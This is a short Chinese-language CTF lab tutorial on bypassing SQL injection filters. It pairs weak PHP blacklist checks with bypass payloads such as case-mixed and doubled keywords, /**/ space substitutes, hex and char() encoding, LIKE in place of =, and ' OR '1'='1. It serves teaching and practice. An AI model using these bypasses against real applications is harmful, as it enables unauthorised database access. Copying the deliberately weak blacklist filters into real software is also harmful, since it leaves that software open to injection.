# SQL 注入过滤绕过

## 概述

很多应用会过滤 SQL 关键字或特殊字符，但过滤不严格时仍可被绕过。

## 常见过滤方式

### 1. 关键字黑名单

```php
$blacklist = ['select', 'union', 'from', 'where'];
foreach ($blacklist as $word) {
    if (stripos($input, $word) !== false) die('Hacked!');
}
```

绕过方法：

- **大小写混合**：`SeLeCt`, `UnIoN`
- **双写绕过**：`selselectect`, `ununionion`
- **内联注释**：`/*!SELECT*/`, `/*!UNION*/`
- **编码**：URL 编码、十六进制

### 2. 空格过滤

```php
if (strpos($input, ' ') !== false) die('Hacked!');
```

绕过：

- `/**/` 注释替代空格：`SELECT/**/*/**/FROM/**/users`
- `%09`（Tab）
- `%0a`（换行）
- `+`（URL 中的空格）
- `%a0`（某些编码下的空格）

### 3. 引号过滤

```php
if (strpos($input, "'") !== false) die('Hacked!');
```

绕过：

- 数字型注入不需要引号
- 使用 `0x` 十六进制：`0x61646D696E` = `admin`
- 使用 `char()` 函数：`char(97,100,109,105,110)` = `admin`

### 4. 等号过滤

```php
if (strpos($input, '=') !== false) die('Hacked!');
```

绕过：

- `LIKE` 替代：`WHERE username LIKE 'admin'`
- `REGEXP`：`WHERE username REGEXP 'admin'`
- `BETWEEN`：`WHERE id BETWEEN 1 AND 1`
- `IN`：`WHERE id IN (1)`

### 5. 注释符过滤

```php
if (strpos($input, '--') !== false || strpos($input, '#') !== false) die('Hacked!');
```

绕过：

- `;%00`（空字节）
- 闭合后面的引号：`' OR '1'='1`

## 练习步骤

1. 尝试基本注入 — 被过滤
2. 分析过滤规则
3. 使用绕过技术构造 payload
4. 获取数据和 flag

## flag

在数据库中查找 `CR{...}` 格式的 flag。
